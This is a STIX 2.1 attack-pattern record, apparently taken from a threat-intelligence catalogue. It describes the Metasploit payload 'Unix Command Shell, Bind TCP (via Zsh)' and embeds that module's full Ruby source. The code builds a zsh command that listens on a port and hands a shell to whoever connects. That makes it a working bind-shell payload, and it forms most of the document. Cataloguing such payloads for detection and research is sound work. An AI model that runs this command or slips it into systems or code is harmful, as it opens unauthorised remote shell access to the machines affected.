{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2a7e10ec-2213-4359-b613-0ad7a9d0ea23",
    "created": "2024-08-14T16:33:19.316859Z",
    "modified": "2024-08-14T16:33:19.316863Z",
    "name": "Unix Command Shell, Bind TCP (via Zsh)",
    "description": " Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/bind_zsh.rb",
            "external_id": "bind_zsh.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 99\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Unix Command Shell, Bind TCP (via Zsh)',\n     'Description'   => %q{\n        Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is\n        often available, please be aware it isn't usually installed by default.\n      },\n     'Author'        =>\n       [\n         'Doug Prostko <dougtko[at]gmail.com>',    # Initial payload\n         'Wang Yihang <wangyihanger[at]gmail.com>' # Simplified redirections\n       ],\n     'License'       => MSF_LICENSE,\n     'Platform'      => 'unix',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::BindTcp,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd',\n     'RequiredCmd'   => 'zsh',\n     'Payload'       =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('ZSHPath', [true, 'The path to the ZSH executable', 'zsh'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    \"#{datastore['ZSHPath']} -c 'zmodload zsh/net/tcp && ztcp -l #{datastore['LPORT']} && ztcp -a $REPLY && #{datastore['ZSHPath']} >&$REPLY 2>&$REPLY 0>&$REPLY'\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}